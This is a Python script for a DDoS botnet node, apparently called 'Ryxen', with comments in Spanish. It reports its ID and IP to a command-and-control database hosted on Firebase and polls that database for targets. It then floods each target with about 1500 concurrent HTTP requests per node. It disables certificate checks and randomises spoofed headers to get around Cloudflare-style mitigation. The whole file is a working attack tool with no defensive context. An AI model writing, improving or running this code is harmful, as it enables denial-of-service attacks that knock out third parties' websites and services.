import asyncio
import aiohttp
import time
import random
import ssl
import socket

DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

# Obtenemos la IP pública para que el C2 nos identifique
try:
    MY_IP = requests.get('https://api.ipify.org').text
except:
    MY_IP = "Unknown-IP"

NODE_ID = f"Ryxen-V13-{random.randint(100, 999)}"

async def report_status():
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                # Reportamos ID e IP al C2
                await session.put(f"{NODES_URL}/{NODE_ID}.json", 
                                 json={"id": NODE_ID, "ip": MY_IP, "t": time.time()})
            except: pass
            await asyncio.sleep(10)

async def flood(target, end_time):
    # Forzamos TLS 1.3 para máximo estrés en el handshake de Cloudflare
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    
    # Optimizamos el conector para reutilizar sockets pero con headers nuevos
    conn = aiohttp.TCPConnector(limit=0, ssl=ssl_ctx, family=socket.AF_INET, keepalive_timeout=60)
    
    async with aiohttp.ClientSession(connector=conn) as session:
        while time.time() < end_time:
            try:
                # Headers dinámicos para saltar mitigación por patrón
                headers = {
                    'User-Agent': random.choice(['Mozilla/5.0','Ryxen-Extreme/4.0','Chrome/120.0.0.0']),
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                    'Referer': f"{target}/{random.randint(1,9999)}",
                    'Accept-Encoding': 'gzip, deflate, br'
                }
                # Petición asíncrona pura
                async with session.get(target, headers=headers, timeout=2) as response:
                    # No leemos el cuerpo, solo el status para no gastar RAM del runner
                    response.close()
            except:
                continue

async def main():
    print(f"[SYSTEM] {NODE_ID} [{MY_IP}] Desplegado.")
    asyncio.create_task(report_status())
    
    last_s = ""
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(DB_URL) as r:
                    data = await r.json()
                if data and data.get('stamp') != last_s:
                    last_s = data['stamp']
                    duration = int(data['time'])
                    target = data['target'] if data['target'].startswith("http") else f"http://{data['target']}"
                    
                    print(f"[!] POTENCIA MÁXIMA ACTIVADA -> {target}")
                    # Subimos a 1500 tareas por nodo (15,000 tareas en total)
                    tasks = [flood(target, time.time() + duration) for _ in range(1500)]
                    await asyncio.gather(*tasks)
            except: pass
            await asyncio.sleep(2)

if __name__ == "__main__":
    asyncio.run(main())
    
